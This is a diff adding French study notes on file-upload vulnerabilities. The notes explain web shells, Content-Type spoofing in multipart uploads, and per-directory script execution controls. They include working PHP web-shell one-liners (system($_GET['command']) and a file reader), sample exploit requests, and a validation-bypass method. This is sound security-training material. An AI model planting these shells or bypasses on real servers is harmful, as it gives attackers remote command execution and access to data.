@@ -45,3 +45,81 @@ De nos jours, des vérifications sont faites
 
 **<u>Important :</u>**
 L'en-tête de réponse `Content-Type` peut fournir des indications sur le type de fichier que le serveur pense avoir servi. Si cet en-tête n'a pas été explicitement défini par le code de l'application, il contient normalement le résultat de la correspondance entre l'`extension du fichier et le type MIME`.
+
+## Exploiter l'upload de fichier sans restriction pour déployer un webshell
+On se trouve dans ce scénario lorsque le serveur web nous permet d'upload un fichier script exécutable, tel qu'un php, java ou python.
+
+### Web shell
+Un web shell est un script qui permet à un attaquant d'exécuter des commandes sur un serveur web à travers des requêtes HTTP.
+Si on a accès à un web shell, on a accès à un serveur web entier, on peut faire de l'exfiltrartion de données, etc.
+
+Exemple de one liner web shell : `<?php echo file_get_contents('/path/to/target/file'); ?>`
+
+Un webshell plus exhaustif serait `<?php echo system($_GET['command']); ?>` qui permettrait d'exécuter des commandes en utilisant des requête GET :
+ `GET /example/exploit.php?command=id HTTP/1.1`
+
+## Exploitation d'une validation défectueuse de téléversement de fichiers
+
+Dans cette section, nous examinerons certaines méthodes utilisées par les serveurs web pour valider et assainir l'upload de fichiers.
+Puis la manière dont nous pouvons exploiter les failles de ces mécanismes pour obtenir un shell web permettant l'exécution de code à distance.
+
+### Validation défectueuse du type de fichier
+
+
+Lors d'une soumission d'un formulaire HTTP, le navigateur envoie généralement une requête `POST` contenant un **Content-type** avec la valeur `application/x-www-form-url-encoded `. Ce type est bien pour les données "simples" (nom, adresse, etc), mais pas adéquat pour des binaires/images/etc qui contiennent de nombreux caractères non-alphabétiques. On utilise dans ce cas le **Content-type** `multipart/form-data`. 
+Voir [Ici](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) pour plus de détails.
+
+Prenons un exemple de requête `POST` qui soumets différents types de données, ce qui devrait ressembler à ceci :
+```html
+POST /images HTTP/1.1
+Host: normal-website.com
+Content-Length: 12345
+Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="image"; filename="example.jpg"
+Content-Type: image/jpeg
+
+[...binary content of example.jpg...]
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="description"
+
+This is an interesting description of my image.
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="username"
+
+wiener
+---------------------------012345678901234567890123456--
+```
+On voit que chaque partie contient un header `Content-Disposition` qui fournit une information basique sur le champ d'entrée. Ces parties peuvent également avoir leur propre header `Content-Type`, qui indiquera au serveur le type `MIME`de la donnée soumise par l'utilisateur.
+
+**<u>Validation des uploads de fichier par des sites web</u>**
+Une des manières est de regarder si le header `Content-Type` correspond à un certain type MIME prédéfini par le serveur. Par exemple un serveur peut choisir de seulement autoriser les types **image/jpeg**.
+Si le serveur fait confiance au `Content-Type` de la requête sans faire d'autres validations (vérifier que le contenu du fichier correspond au type MIME), alors une attaque peut être faite en modifiant la valeur du `Content-Type`.
+
+### Empêcher l'exécution de fichiers dans des répertoires accessibles à l'utilisateur
+
+En plus d'empêcher un fichier d'être upload, une défense consiste à empêcher le serveur d'exécuter des scripts qui proviennent d'une entrée utilisateur.
+
+Comme précaution, les serveurs vont généralement exécuter les scripts dont les types MIME ont été renseignés dans un fichier de configuration. Dans le cas contraire, le serveur renverra un message d'erreur ou la valeur du script sans qu'il soit exécuté. 
+
+**<u>Exemple</u>**
+```html
+GET /static/exploit.php?command=id HTTP/1.1
+Host: normal-website.com
+
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 39
+
+<?php echo system($_GET['command']); ?>
+```
+
+Ce genre de configuration diffère souvent entre les répertoires. Il y a de grandes chances qu'un répertoire qui reçoit des fichiers uploadés sera configuré pour avoir des contrôles plus strictes qu'à d'autres localisations du système de fichiers qui seront considérés comme en dehors de la portée des fichiers fournies par l'utilisateurs.
+
+
+**Tips**:
+- Les serveurs web utilisent souvent le champ **filename** dans les requêtes `multipart/form-data` pour déterminer le nom et la localisation pour sauvegarder le fichier.
